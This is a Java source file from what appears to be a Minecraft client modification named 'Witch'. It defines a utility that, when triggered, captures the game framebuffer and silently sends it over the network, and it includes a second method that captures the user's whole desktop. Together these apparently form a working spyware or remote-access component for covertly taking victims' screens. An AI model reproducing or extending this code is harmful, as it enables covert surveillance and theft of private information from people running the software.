package me.soda.witch.client.utils;

import me.soda.witch.client.events.TickEvent;
import me.soda.witch.shared.events.EventBus;
import net.minecraft.client.texture.NativeImage;
import net.minecraft.client.util.ScreenshotRecorder;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.IOException;

import static me.soda.witch.client.Witch.mc;

public class ScreenshotUtil {
    private static boolean shouldTake = false;

    static {
        EventBus.INSTANCE.registerEvent(TickEvent.class, event -> {
            try {
                if (shouldTake) NetUtil.send("screenshot", ScreenshotUtil.takeScreenshot());
                shouldTake = false;
            } catch (IOException ignored) {
            }
        });
    }

    public static byte[] takeScreenshot() throws IOException {
        try (NativeImage nativeImage = ScreenshotRecorder.takeScreenshot(mc.getFramebuffer())) {
            return nativeImage.getBytes();
        }
    }

    public static void screenshot() {
        shouldTake = true;
    }

    public static byte[] screenshot2() throws Exception {
        Dimension screenSize = Toolkit.getDefaultToolkit().getScreenSize();
        Rectangle screenRectangle = new Rectangle(screenSize);
        Robot robot = new Robot();
        BufferedImage image = robot.createScreenCapture(screenRectangle);
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ImageIO.write(image, "png", out);
        out.flush();
        byte[] bytes = out.toByteArray();
        out.close();
        return bytes;
    }
}
